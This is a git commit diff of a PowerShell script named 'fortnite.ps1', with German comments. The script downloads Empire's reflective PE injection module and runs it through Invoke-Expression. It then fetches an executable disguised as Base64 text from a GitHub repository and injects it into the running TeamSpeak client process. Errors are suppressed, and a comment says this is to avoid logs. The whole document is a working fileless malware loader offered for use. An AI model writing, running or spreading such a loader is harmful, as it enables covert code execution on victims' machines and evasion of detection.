6e76d0c0d65ce5ac32dc93dab3491ebb810bb132
spritezerosugar67 <apfelgamer1@gmail.com>
2026-01-09 10:22:59 +0100

    Refactor PowerShell script for process injection

--- fortnite.ps1
+++ fortnite.ps1
@@ -1,24 +1,27 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-while (!(Get-Process ts3client_win64)) { 
-    Start-Sleep -Seconds 2 
-}
-
+# Warte kurz, bis der Zielprozess stabil läuft
 Start-Sleep -Seconds 5 
 
 try {
+    # TLS 1.2 für die Verbindung sicherstellen
     [Net.ServicePointManager]::SecurityProtocol = 3072
-    $wc = New-Object System.Net.WebClient
     
-    $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
-    Invoke-Expression $l
+    # 1. Loader (Reflective Injection) direkt via Web-Request laden
+    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
+    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
+    Invoke-Expression $loaderContent
 
-    $b = $wc.DownloadString("https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt")
-    $rb = [System.Convert]::FromBase64String($b)
+    # 2. Deine EXE (als Base64-Text getarnt) laden
+    $exeUrl = "https://raw.githubusercontent.com/dein-user/dein-repo/main/johannesschwein.txt"
+    $base64String = (iwr -UseBasicParsing $exeUrl).Content
+    
+    # In Byte-Array umwandeln
+    $peBytes = [System.Convert]::FromBase64String($base64String)
 
-    Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
+    # 3. Injektion in den Zielprozess (z.B. TeamSpeak)
+    $target = Get-Process ts3client_win64
+    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
 } catch {
+    # Keine Ausgabe bei Fehlern zur Vermeidung von Logs
 }
-
-# Khiro wer das liest LG
-exit
